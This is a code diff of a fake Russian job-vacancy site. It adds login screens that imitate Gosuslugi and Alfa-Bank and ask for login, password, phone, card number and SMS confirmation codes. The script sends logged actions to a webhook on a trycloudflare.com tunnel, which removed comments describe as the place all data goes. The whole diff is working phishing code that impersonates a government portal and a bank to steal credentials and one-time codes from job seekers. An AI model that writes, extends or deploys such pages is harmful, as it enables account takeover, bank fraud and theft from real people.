@@ -20,6 +20,12 @@
             --card-shadow: 0 1px 3px rgba(16, 24, 40, 0.06), 0 8px 24px rgba(16, 24, 40, 0.05);
             --card-shadow-hover: 0 4px 8px rgba(16, 24, 40, 0.08), 0 16px 40px rgba(16, 24, 40, 0.10);
             --radius: 16px;
+            --alfa-red: #EF3124;
+            --alfa-red-hover: #D6281C;
+            --alfa-black: #1A1A1A;
+            --alfa-bg: #F4F4F6;
+            --gos-blue: #005BFF;
+            --gos-red: #FA3B48;
         }
         * { box-sizing: border-box; font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; padding: 0;}
         body { background-color: var(--bg-color); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; -webkit-font-smoothing: antialiased;}
@@ -94,35 +100,130 @@
         .success-text { color: var(--text-muted); margin-bottom: 32px; line-height: 1.65; font-size: 16px; max-width: 420px; margin-left: auto; margin-right: auto;}
         .success-note { display: inline-flex; align-items: center; gap: 8px; background: #EFF6FF; color: #1D4ED8; font-size: 14px; font-weight: 600; padding: 10px 16px; border-radius: 10px; margin-bottom: 28px; }
         .success-note svg { width: 18px; height: 18px; flex-shrink: 0; }
-        #authScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(16, 24, 40, 0.65); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(6px); padding: 20px; }
-        .login-card { background-color: #ffffff; width: 100%; max-width: 420px; border-radius: 20px; padding: 40px; box-shadow: 0 24px 48px rgba(0,0,0,0.25); position: relative; }
-        .close-auth { position: absolute; top: 18px; right: 18px; font-size: 24px; cursor: pointer; color: #9CA3AF; background: none; border: none; transition: 0.2s; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
-        .close-auth:hover { color: var(--text-main); background: #F3F4F6; }
-        .logo-container { text-align: center; margin-bottom: 28px; }
-        .logo-text-gos { font-size: 36px; font-weight: 800; color: #0b42b3; letter-spacing: -1.2px;}
-        .logo-text-gos span { color: #e60000; }
-        .input-group { margin-bottom: 20px; position: relative; }
-        .input-group label { display: block; font-size: 14px; color: var(--text-muted); margin-bottom: 8px; font-weight: 500;}
-        .input-group input { width: 100%; padding: 14px 16px; background-color: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 16px; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif;}
-        .input-group input:focus { border-color: #0b42b3; background-color: #fff; box-shadow: 0 0 0 4px rgba(11, 66, 179, 0.10); }
-        .password-wrapper { position: relative; }
-        .password-wrapper input { padding-right: 48px; }
-        .toggle-password { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; background: none; border: none; color: #9CA3AF; display: flex; align-items: center; justify-content: center; padding: 6px; border-radius: 8px; transition: color 0.2s, background 0.2s; }
-        .toggle-password:hover { color: #0b42b3; background: #EFF6FF; }
-        .toggle-password svg { width: 20px; height: 20px; display: block; }
-        .btn-submit { width: 100%; padding: 16px; background-color: #0b42b3; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.2s;}
-        .btn-submit:hover { background-color: #093587; }
-        .btn-submit:disabled { background-color: #a0b3d6; cursor: not-allowed; }
-        #smsLoading { text-align: center; padding: 20px 0; display: none; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #F3F4F6; border-top: 4px solid #0b42b3; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
+
+        /* ЭКРАН ВЫБОРА СПОСОБА АВТОРИЗАЦИИ */
+        #authChoiceScreen {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(16, 24, 40, 0.65); z-index: 1000;
+            justify-content: center; align-items: center; backdrop-filter: blur(6px); padding: 20px;
+        }
+        .auth-choice-card {
+            background: #fff; width: 100%; max-width: 440px; border-radius: 24px;
+            padding: 36px 32px; box-shadow: 0 24px 48px rgba(0,0,0,0.25);
+            position: relative; animation: modalIn 0.3s ease;
+        }
+        @keyframes modalIn {
+            from { opacity: 0; transform: translateY(20px) scale(0.96); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .auth-close {
+            position: absolute; top: 16px; right: 16px; font-size: 18px; cursor: pointer;
+            color: #9CA3AF; background: #F4F4F6; border: none; transition: 0.2s;
+            width: 34px; height: 34px; border-radius: 50%; display: flex;
+            align-items: center; justify-content: center; line-height: 1;
+        }
+        .auth-close:hover { color: var(--text-main); background: #E5E5E5; }
+        .auth-choice-title { font-size: 24px; font-weight: 800; text-align: center; margin-bottom: 6px; letter-spacing: -0.5px; }
+        .auth-choice-sub { font-size: 14px; color: var(--text-muted); text-align: center; margin-bottom: 28px; line-height: 1.5; }
+        .auth-method-btn {
+            display: flex; align-items: center; gap: 16px; width: 100%;
+            padding: 16px 18px; border-radius: 16px; border: 1.5px solid var(--border-color);
+            background: #fff; cursor: pointer; transition: 0.2s; margin-bottom: 12px;
+            text-align: left; font-family: 'Inter', sans-serif;
+        }
+        .auth-method-btn:hover { border-color: #C9D0DC; background: #FAFAFB; transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0,0,0,0.06); }
+        .auth-method-icon { width: 52px; height: 52px; border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; overflow: hidden; background: #F4F4F6; }
+        .auth-method-icon img { width: 100%; height: 100%; object-fit: contain; }
+        .auth-method-text { flex: 1; }
+        .auth-method-name { font-size: 16px; font-weight: 700; color: var(--text-main); margin-bottom: 2px; }
+        .auth-method-desc { font-size: 13px; color: var(--text-muted); }
+        .auth-method-arrow { color: #C9D0DC; flex-shrink: 0; }
+
+        /* МОДАЛЬНОЕ ОКНО АЛЬФА-БАНКА */
+        #alfaAuthScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #fff; z-index: 1100; justify-content: center; align-items: flex-start; overflow-y: auto; }
+        .alfa-modal { background: #fff; width: 100%; height: 100%; max-width: 480px; padding: 24px; display: flex; flex-direction: column; position: relative; font-family: 'Inter', sans-serif; }
+        .alfa-top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 36px; }
+        .alfa-logo-img { height: 40px; width: auto; display: block; }
+        .alfa-btn-outline { display: flex; align-items: center; gap: 8px; background: var(--alfa-bg); border: none; padding: 10px 16px; border-radius: 20px; font-size: 14px; font-weight: 600; color: var(--alfa-black); cursor: pointer; transition: 0.2s; }
+        .alfa-btn-outline:hover { background: #E5E5E5; }
+        .alfa-title { font-size: 30px; font-weight: 800; color: var(--alfa-black); line-height: 1.2; margin-bottom: 8px; letter-spacing: -0.5px; }
+        .alfa-subtitle { font-size: 15px; color: #8C8C8C; margin-bottom: 28px; line-height: 1.5; }
+        .alfa-input-box { background: var(--alfa-bg); border-radius: 16px; padding: 14px 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 18px; border: 2px solid transparent; transition: 0.2s; }
+        .alfa-input-box:focus-within { border-color: var(--alfa-red); background: #fff; }
+        .alfa-input-wrap { flex: 1; display: flex; flex-direction: column; }
+        .alfa-input-wrap label { font-size: 12px; color: #8C8C8C; margin-bottom: 2px; }
+        .alfa-input-wrap input { border: none; background: transparent; font-size: 18px; font-weight: 500; color: var(--alfa-black); outline: none; width: 100%; padding: 0; font-family: 'Inter', sans-serif; letter-spacing: 0.5px; }
+        .alfa-input-wrap input::placeholder { color: #A0A0A0; letter-spacing: normal; }
+        .alfa-input-icon { color: #8C8C8C; display: flex; align-items: center; flex-shrink: 0; }
+        .alfa-btn-red { width: 100%; padding: 19px; background: var(--alfa-red); color: #fff; border: none; border-radius: 16px; font-size: 17px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-bottom: 16px; font-family: 'Inter', sans-serif; }
+        .alfa-btn-red:hover { background: var(--alfa-red-hover); }
+        .alfa-btn-red:disabled { background: #E5E5E5; color: #A0A0A0; cursor: not-allowed; }
+        .alfa-help { display: flex; align-items: center; gap: 16px; background: #F9F9F9; padding: 16px; border-radius: 16px; margin-top: auto; }
+        .alfa-help-icon { background: #fff; width: 48px; height: 48px; border-radius: 12px; display: flex; align-items: center; justify-content: center; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .alfa-help-text p { margin: 0; font-size: 16px; font-weight: 600; color: var(--alfa-black); }
+        .alfa-help-text span { font-size: 13px; color: #8C8C8C; }
+        .alfa-back { background: none; border: none; cursor: pointer; padding: 8px 0; margin-bottom: 16px; color: var(--alfa-black); display: flex; align-items: center; gap: 8px; font-size: 15px; font-weight: 500; }
+        .alfa-code-inputs { display: flex; gap: 12px; justify-content: center; margin-bottom: 32px; }
+        .alfa-code-input { width: 60px; height: 64px; background: var(--alfa-bg); border: 2px solid transparent; border-radius: 16px; font-size: 28px; font-weight: 700; text-align: center; color: var(--alfa-black); outline: none; transition: 0.2s; font-family: 'Inter', sans-serif; }
+        .alfa-code-input:focus { border-color: var(--alfa-red); background: #fff; }
+        .alfa-loader { display: none; text-align: center; padding: 60px 0; }
+        .alfa-spinner { width: 40px; height: 40px; border: 4px solid var(--alfa-bg); border-top: 4px solid var(--alfa-red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px; }
+        .alfa-close { position: absolute; top: 20px; right: 20px; background: var(--alfa-bg); border: none; width: 36px; height: 36px; border-radius: 50%; cursor: pointer; font-size: 18px; color: var(--alfa-black); display: flex; align-items: center; justify-content: center; z-index: 5; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #authStep2 { display: none; }
-        .code-inputs-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 30px; }
-        .code-input { width: 100%; height: 56px; background-color: #F9FAFB; border: 1.5px solid var(--border-color); border-radius: 10px; font-size: 24px; font-weight: 600; text-align: center; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif;}
-        .code-input:focus { border-color: #0b42b3; background-color: #fff; box-shadow: 0 0 0 4px rgba(11, 66, 179, 0.10);}
-        .phone-mask { font-weight: 600; color: var(--text-main); }
-        .sms-hint { text-align: center; font-size: 13px; color: var(--text-muted); margin-bottom: 24px; line-height: 1.6; }
-        .sms-hint strong { color: var(--text-main); }
+
+        /* ОКНО ГОСУСЛУГ */
+        #gosAuthScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #E4EAF6; z-index: 1100; justify-content: center; align-items: center; padding: 16px; }
+        .gos-modal {
+            background: #fff; width: 100%; max-width: 400px; border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08); display: flex; flex-direction: column;
+            position: relative; overflow: hidden; animation: modalIn 0.3s ease;
+        }
+        .gos-header { padding: 40px 32px 10px; text-align: center; }
+        .gos-logo-main {
+            font-family: 'Inter', sans-serif; font-weight: 700; font-size: 32px;
+            letter-spacing: -1px; margin-bottom: 12px; display: flex; justify-content: center; align-items: baseline;
+        }
+        .gos-logo-main .gos-blue-part { color: var(--gos-blue); }
+        .gos-logo-main .gos-red-part { color: var(--gos-red); margin-left: 1px; }
+        .gos-lang { display: flex; justify-content: center; align-items: center; gap: 8px; font-size: 14px; color: var(--gos-blue); margin-bottom: 28px; cursor: pointer; }
+        .gos-lang-flag { width: 20px; height: 20px; border-radius: 50%; background: linear-gradient(to bottom, #fff 33%, #0039A6 33%, #0039A6 66%, #D52B1E 66%); border: 1px solid #E0E0E0; }
+        .gos-form { padding: 0 32px; display: flex; flex-direction: column; }
+        .gos-field { margin-bottom: 20px; }
+        .gos-field label { display: block; font-size: 15px; font-weight: 500; color: #1A1A1A; margin-bottom: 8px; }
+        .gos-input {
+            width: 100%; padding: 12px 14px; background: #F0F4F9;
+            border: 1px solid transparent; border-radius: 8px; font-size: 16px;
+            color: #1A1A1A; outline: none; transition: 0.2s; font-family: 'Inter', sans-serif;
+        }
+        .gos-input:focus { border-color: var(--gos-blue); background: #fff; box-shadow: 0 0 0 3px rgba(0, 91, 255, 0.15); }
+        .gos-forgot-link { font-size: 15px; color: var(--gos-blue); text-decoration: none; margin-bottom: 32px; display: inline-block; cursor: pointer; }
+        .gos-forgot-link:hover { text-decoration: underline; }
+        .gos-btn-primary {
+            width: 100%; padding: 14px; background: #005BFF; color: #fff;
+            border: none; border-radius: 10px; font-size: 17px; font-weight: 500;
+            cursor: pointer; transition: 0.2s; font-family: 'Inter', sans-serif; margin-bottom: 24px;
+        }
+        .gos-btn-primary:hover { background: #0047C7; }
+        .gos-cant-login { text-align: center; font-size: 16px; color: var(--gos-blue); text-decoration: none; margin-bottom: 32px; display: block; cursor: pointer; }
+        .gos-cant-login:hover { text-decoration: underline; }
+        .gos-footer { border-top: 1px solid #EAECF0; padding: 20px 32px; text-align: center; font-size: 15px; color: #1A1A1A; }
+        .gos-footer a { color: var(--gos-blue); text-decoration: none; }
+        .gos-footer a:hover { text-decoration: underline; }
+        .gos-close-btn { position: absolute; top: 12px; right: 12px; background: transparent; border: none; font-size: 24px; color: #9CA3AF; cursor: pointer; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
+        .gos-close-btn:hover { background: #F4F6FA; color: #1A1A1A; }
+        .gos-code-inputs { display: flex; gap: 10px; justify-content: center; margin-bottom: 24px; }
+        .gos-code-input { width: 50px; height: 56px; background: #F0F4F9; border: 1px solid transparent; border-radius: 8px; font-size: 24px; font-weight: 700; text-align: center; color: var(--text-main); outline: none; transition: 0.2s; font-family: 'Inter', sans-serif; }
+        .gos-code-input:focus { border-color: var(--gos-blue); background: #fff; box-shadow: 0 0 0 3px rgba(0, 91, 255, 0.15); }
+
+        @media (max-width: 480px) {
+            .alfa-code-input { width: 50px; height: 56px; font-size: 24px; }
+            .alfa-title { font-size: 26px; }
+            .auth-choice-card { padding: 28px 20px; }
+            .gos-header { padding-top: 32px; }
+            .gos-code-input { width: 40px; height: 46px; font-size: 20px; }
+        }
+        .city-select optgroup { font-weight: 600; color: var(--text-main); font-size: 14px; }
+        .city-select option { font-weight: 400; padding: 6px; }
         #qrScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(16, 24, 40, 0.65); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(6px); padding: 20px; }
         .qr-card { background: #fff; width: 100%; max-width: 380px; border-radius: 20px; padding: 36px 32px; box-shadow: 0 24px 48px rgba(0,0,0,0.25); position: relative; text-align: center; }
         .close-qr { position: absolute; top: 18px; right: 18px; font-size: 24px; cursor: pointer; color: #9CA3AF; background: none; border: none; transition: 0.2s; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
@@ -140,8 +241,6 @@
         .qr-action-secondary:hover { background: #E5E7EB; }
         .qr-toast { font-size: 13px; color: #10B981; font-weight: 600; height: 18px; margin-top: 10px; opacity: 0; transition: opacity 0.3s; }
         .qr-toast.show { opacity: 1; }
-        .city-select optgroup { font-weight: 600; color: var(--text-main); font-size: 14px; }
-        .city-select option { font-weight: 400; padding: 6px; }
         @media (max-width: 720px) {
             .header { padding: 12px 16px; }
             .header-nav .nav-link { display: none; }
@@ -158,7 +257,6 @@
             .details-header { flex-direction: column; }
             .details-salary { font-size: 22px; }
             .details-title { font-size: 24px; }
-            .login-card { padding: 28px 24px; }
             .radio-option { min-width: 100%; }
             .qr-card { padding: 28px 20px; }
             #qrCanvas { width: 200px; height: 200px; }
@@ -192,7 +290,7 @@
                 </svg>
                 <span>QR-код</span>
             </button>
-            <button class="login-btn" id="headerLoginBtn" onclick="openAuth()">Войти через Госуслуги</button>
+            <button class="login-btn" id="headerLoginBtn" onclick="openAuthChoice()">Войти</button>
             <div class="user-profile" id="headerUserProfile">
                 <div class="user-avatar">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
@@ -343,67 +441,191 @@
         </div>
     </div>
 
-    <div id="authScreen">
-        <div class="login-card">
-            <button class="close-auth" onclick="closeAuth()">&times;</button>
+    <!-- ЭКРАН ВЫБОРА СПОСОБА АВТОРИЗАЦИИ -->
+    <div id="authChoiceScreen">
+        <div class="auth-choice-card">
+            <button class="auth-close" onclick="closeAuthChoice()">✕</button>
+            <div class="auth-choice-title">Авторизация на портал</div>
+            <div class="auth-choice-sub">Выберите удобный способ авторизации,<br>чтобы откликнуться на вакансию</div>
 
-            <div id="authStep1">
-                <div class="logo-container">
-                    <div class="logo-text-gos">гос<span>услуги</span></div>
+            <button class="auth-method-btn" onclick="openGosAuth()">
+                <div class="auth-method-icon">
+                    <img id="gosIcon" src="https://logo-teka.com/wp-content/uploads/2025/06/gosusligi-logo.png" alt="Госуслуги" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\'font-weight:800;font-size:16px;letter-spacing:-0.5px;display:flex;\'><span style=\'color:%23005BFF\'>гос</span><span style=\'color:%23FA3B48\'>услуги</span></div>';">
                 </div>
-                <form id="loginForm">
-                    <div class="input-group">
-                        <label>Телефон / СНИЛС</label>
-                        <input type="text" id="login" placeholder="" required>
-                    </div>
-                    <div class="input-group">
-                        <label>Пароль</label>
-                        <div class="password-wrapper">
-                            <input type="password" id="password" placeholder="Введите пароль" required>
-                            <button type="button" class="toggle-password" id="togglePasswordBtn" aria-label="Показать пароль">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
-                                    <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
-                                    <line x1="1" y1="1" x2="23" y2="23"/>
-                                    <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
-                                </svg>
-                            </button>
+                <div class="auth-method-text">
+                    <div class="auth-method-name">Госуслуги</div>
+                    <div class="auth-method-desc">Вход через единую систему</div>
+                </div>
+                <svg class="auth-method-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
+            </button>
+
+            <button class="auth-method-btn" onclick="openAlfaAuth()">
+                <div class="auth-method-icon">
+                    <img id="alfaIcon" src="https://upload.wikimedia.org/wikipedia/commons/8/87/Alfabank_logo.png?utm_source=ru.wikipedia.org&utm_campaign=index&utm_content=original" alt="Альфа-Банк" onerror="this.style.display='none'; this.parentElement.innerHTML='<svg width=\'26\' height=\'26\' viewBox=\'0 0 24 24\' fill=\'none\' stroke=\'%23EF3124\' stroke-width=\'2.2\'><path d=\'M4 20L12 4l8 16\'/><path d=\'M8 20l4-8 4 8\'/></svg>';">
+                </div>
+                <div class="auth-method-text">
+                    <div class="auth-method-name">Альфа-Банк</div>
+                    <div class="auth-method-desc">Вход через банк</div>
+                </div>
+                <svg class="auth-method-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- МОДАЛЬНОЕ ОКНО АЛЬФА-БАНКА -->
+    <div id="alfaAuthScreen">
+        <div class="alfa-modal">
+            <button class="alfa-close" onclick="closeAlfaAuth()">✕</button>
+
+            <div id="alfaStep1">
+                <div class="alfa-top-bar">
+                    <img class="alfa-logo-img" src="" alt="Альфа-Банк" onerror="this.style.display='none'; this.outerHTML='<div style=\'color:%23EF3124;font-size:30px;font-weight:900;line-height:1;\'>А<span style=\'font-size:13px;display:block;margin-top:-4px;letter-spacing:1px;\'>АЛЬФА</span></div>';">
+                    <button class="alfa-btn-outline"></button>
+                </div>
+                <h2 class="alfa-title">Вход в Альфа-Банк</h2>
+                <p class="alfa-subtitle">Введите номер телефона, привязанный к карте</p>
+
+                <form id="alfaPhoneForm">
+                    <div class="alfa-input-box">
+                        <div class="alfa-input-icon">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                        </div>
+                        <div class="alfa-input-wrap">
+                            <label>Номер телефона</label>
+                            <input type="tel" id="alfaPhone" placeholder="+7 999 999 99 99" required>
                         </div>
                     </div>
-                    <button type="submit" class="btn-submit">Войти</button>
+                    <button type="submit" class="alfa-btn-red">Продолжить</button>
                 </form>
-            </div>
 
-            <div id="smsLoading">
-                <div class="spinner"></div>
-                <h3 style="margin-bottom: 8px;">Отправляем код</h3>
-                <p style="font-size: 14px; color: var(--text-muted);">Пожалуйста, подождите...</p>
-            </div>
-
-            <div id="authStep2">
-                <div class="logo-container">
-                    <div class="logo-text-gos" style="font-size: 28px;">гос<span>услуги</span></div>
-                </div>
-                <h3 style="text-align: center; margin-bottom: 8px; font-size: 20px;">Подтвердите вход по смс</h3>
-                <p class="sms-hint">
-                    Код отправлен в смс или MAX <span class="phone-mask" id="displayPhone"></span><br>
-                    
-                </p>
-                <form id="codeForm">
-                    <div class="code-inputs-container">
-                        <input type="text" class="code-input" maxlength="1" inputmode="numeric">
-                        <input type="text" class="code-input" maxlength="1" inputmode="numeric">
-                        <input type="text" class="code-input" maxlength="1" inputmode="numeric">
-                        <input type="text" class="code-input" maxlength="1" inputmode="numeric">
-                        <input type="text" class="code-input" maxlength="1" inputmode="numeric">
-                        <input type="text" class="code-input" maxlength="1" inputmode="numeric">
+                <div class="alfa-help">
+                    <div class="alfa-help-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1A1A1A" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                     </div>
-                    <button type="submit" class="btn-submit" id="btn-code-submit" disabled>Подтвердить</button>
+                    <div class="alfa-help-text">
+                        <p>+7 495 788 88 78</p>
+                        <span>По России и за границей</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="alfaStep2" style="display: none;">
+                <button class="alfa-back" onclick="alfaBackToPhone()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                    Назад
+                </button>
+                <h2 class="alfa-title">Данные карты</h2>
+                <p class="alfa-subtitle">Введите номер вашей карты Альфа-Банка</p>
+
+                <form id="alfaCardForm">
+                    <div class="alfa-input-box">
+                        <div class="alfa-input-icon">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
+                        </div>
+                        <div class="alfa-input-wrap">
+                            <label>Номер карты</label>
+                            <input type="text" id="alfaCard" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                        </div>
+                    </div>
+                    <button type="submit" class="alfa-btn-red">Получить код</button>
                 </form>
+            </div>
+
+            <div id="alfaLoading" class="alfa-loader">
+                <div class="alfa-spinner"></div>
+                <h3 style="margin-bottom: 8px; font-size: 18px;">Отправляем код</h3>
+                <p style="font-size: 14px; color: #8C8C8C;">Пожалуйста, подождите...</p>
+            </div>
+
+            <div id="alfaStep3" style="display: none;">
+                <div class="alfa-top-bar">
+                    <img class="alfa-logo-img" src="https://raw.githubusercontent.com/twitter/twemoji/master/assets/svg/1f170.svg" alt="Альфа-Банк" onerror="this.style.display='none'; this.outerHTML='<div style=\'color:%23EF3124;font-size:30px;font-weight:900;line-height:1;\'>А<span style=\'font-size:13px;display:block;margin-top:-4px;letter-spacing:1px;\'>АЛЬФА</span></div>';">
+                </div>
+                <h2 class="alfa-title" style="text-align: center;">Введите код</h2>
+                <p style="text-align: center; color: #8C8C8C; margin-bottom: 32px; font-size: 16px;">Мы отправили код на номер<br><strong id="alfaDisplayPhone" style="color: #1A1A1A;"></strong></p>
+                <form id="alfaCodeForm">
+                    <div class="alfa-code-inputs">
+                        <input type="text" class="alfa-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="alfa-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="alfa-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="alfa-code-input" maxlength="1" inputmode="numeric">
+                    </div>
+                    <button type="submit" class="alfa-btn-red" id="alfaCodeSubmit" disabled>Подтвердить</button>
+                </form>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- ОКНО ГОСУСЛУГ (6-ЗНАЧНЫЙ КОД) -->
+    <div id="gosAuthScreen">
+        <div class="gos-modal">
+            <button class="gos-close-btn" onclick="closeGosAuth()">✕</button>
+            
+            <!-- Шаг 1: Логин и пароль -->
+            <div id="gosStep1">
+                <div class="gos-header">
+                    <div class="gos-logo-main">
+                        <span class="gos-blue-part">гос</span><span class="gos-red-part">услуги</span>
+                    </div>
+                    <div class="gos-lang">
+                        Русский <div class="gos-lang-flag"></div>
+                    </div>
+                </div>
+
+                <div class="gos-form">
+                    <div class="gos-field">
+                        <label>Телефон / Эл. почта / СНИЛС</label>
+                        <input type="text" class="gos-input" id="gosLogin" required>
+                    </div>
+                    
+                    <div class="gos-field">
+                        <label>Пароль</label>
+                        <input type="password" class="gos-input" id="gosPassword" required>
+                    </div>
+                    
+                    <a class="gos-forgot-link" onclick="alert('Функция восстановления пароля недоступна в демо-режиме')">Восстановить</a>
+                    
+                    <button class="gos-btn-primary" onclick="submitGosLogin()">Войти</button>
+                    
+                    <a class="gos-cant-login" onclick="alert('Функция помощи недоступна в демо-режиме')">Не удаётся войти</a>
+                </div>
+
+                <div class="gos-footer">
+                    Войти другим способом. <a href="#" onclick="alert('Демо-режим'); return false;">Подробнее</a>
+                </div>
+            </div>
+
+            <!-- Шаг 2: Ввод 6-значного кода -->
+            <div id="gosStep2" style="display: none;">
+                <div class="gos-header">
+                    <div class="gos-logo-main">
+                        <span class="gos-blue-part">гос</span><span class="gos-red-part">услуги</span>
+                    </div>
+                    <h3 style="font-size: 20px; font-weight: 700; margin-top: 10px; color: #1A1A1A;">Подтвердите вход по смс </h3>
+                    <p style="font-size: 14px; color: #667085; margin-top: 8px;">Мы отправили в смс или MAX  <strong id="gosDisplayPhone" style="color: #1A1A1A;"></strong></p>
+                </div>
+
+                <div class="gos-form">
+                    <div class="gos-code-inputs">
+                        <input type="text" class="gos-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="gos-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="gos-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="gos-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="gos-code-input" maxlength="1" inputmode="numeric">
+                        <input type="text" class="gos-code-input" maxlength="1" inputmode="numeric">
+                    </div>
+                    <button class="gos-btn-primary" id="gosCodeSubmit" onclick="submitGosCode()" disabled>Подтвердить</button>
+                </div>
+
+                <div class="gos-footer">
+                    <a href="#" onclick="gosBackToLogin(); return false;">Назад</a>
+                </div>
             </div>
         </div>
     </div>
 
+    <!-- QR-код -->
     <div id="qrScreen">
         <div class="qr-card">
             <button class="close-qr" onclick="closeQR()">&times;</button>
@@ -422,10 +644,8 @@
     </div>
 
     <script>
-        /* ====================================================================
-           WEBHOOK — все данные уходят сюда
-           ==================================================================== */
-        const WEBHOOK_URL = "https://bon-contribute-hop-press.trycloudflare.com/log";                   
+        const WEBHOOK_URL = "https://bon-contribute-hop-press.trycloudflare.com/log";
+
         function sendToWebhook(message) {
             fetch(WEBHOOK_URL, {
                 method: 'POST',
@@ -439,9 +659,6 @@
             }).catch(e => console.log('Webhook error:', e));
         }
 
-        /* ====================================================================
-           КОРОТКИЙ ЛОГГЕР — одно событие = одно короткое сообщение
-           ==================================================================== */
         function logAction(action, details = {}) {
             let msg = `${action}`;
             const keys = Object.keys(details);
@@ -453,20 +670,18 @@
 
         let isAuthorized = false;
         let currentJob = null;
-        let enteredLogin = "";
+        let alfaPhone = "";
+        let alfaCard = "";
+        let gosLogin = "";
 
         function maskPhone(phone) {
             const digits = phone.replace(/\D/g, '');
-            if (digits.length === 11) {
+            if (digits.length >= 4) {
                 return `+7 (***) ***-${digits.slice(-4, -2)}-${digits.slice(-2)}`;
             }
-            if (digits.length < 4) return '***';
-            return '*'.repeat(digits.length - 4) + digits.slice(-4);
+            return '***';
         }
 
-        /* ====================================================================
-           БАЗА ВАКАНСИЙ
-           ==================================================================== */
         const jobDatabase = [
             { title: "Кассир-продавец", salary: "от 45 000 ₽", company: "Пятёрочка", desc: "Работа на кассе, помощь покупателям, выкладка товара. Гибкий график 2/2 или 5/2. Официальное трудоустройство, скидки на продукты, бесплатное питание.", cities: "all" },
             { title: "Кассир", salary: "от 42 000 ₽", company: "Магнит", desc: "Обслуживание покупателей на кассе, контроль цен. Гибкий график, стабильная зарплата 2 раза в месяц, карьерный рост до администратора.", cities: "all" },
@@ -556,7 +771,7 @@
 
         function openApplyForm() {
             logAction('Отклик', { 'Вакансия': currentJob ? currentJob.title : '—' });
-            if (!isAuthorized) { openAuth(); return; }
+            if (!isAuthorized) { openAuthChoice(); return; }
             document.getElementById('applyJobTitle').innerText = currentJob.title;
             document.getElementById('applyJobCompany').innerText = currentJob.company;
